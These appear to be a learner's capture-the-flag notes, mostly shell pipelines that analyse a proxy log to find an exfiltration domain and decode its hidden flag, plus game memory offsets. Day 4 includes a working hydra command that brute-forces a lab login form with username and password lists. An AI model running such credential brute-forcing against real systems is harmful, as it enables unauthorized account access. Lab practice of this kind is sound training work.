## Day 4
Instead of using their wfuzz wordlist, I tried writing my own payload with hydra:

``` hydra -L usernames.txt  -P passwords.txt 10.10.229.119 http-post-form "/login.php:username=^USER^&password=^PASS^:Please enter the correct credentials" -V -f ```

## Day 6

The offset to the gold is 12 bytes, the offset to the inventory is 28 bytes. We know the id of the star is "d" because of the shop.

## Day 7

How many unique IP addresses are connected to the proxy server?

``` cat access.log | cut -d ' ' -f2 | sort | uniq | wc -l ```

How many unique domains were accessed by all workstations?

``` cat access.log | cut -d ' ' -f3 | cut -d ':' -f1 | sort | uniq | wc -l ```

What status code is generated by the HTTP requests to the least accessed domain?

``` cat access.log | cut -d ' ' -f3 | cut -d ':' -f1 | sort | uniq -c | sort -n | head -n 1 ```

``` cat access.log | grep partnerservices.getmicrosoftkey.com ```

Based on the high count of connection attempts, what is the name of the suspicious domain?

```cat access.log | cut -d ' ' -f3 | cut -d ':' -f1 | sort | uniq -c | sort -n | tail```

What is the source IP of the workstation that accessed the malicious domain?

``` cat access.log | grep frostlings.bigbadstash.thm | cut -d ' ' -f2  ```

How many requests were made on the malicious domain in total?

``` cat access.log | grep frostlings.bigbadstash.thm | wc -l ```

Having retrieved the exfiltrated data, what is the hidden flag?

``` cat access.log | grep frostlings.bigbadstash.thm | cut -d ' ' -f 5 | cut -d '=' -f2 | base64 -d ```
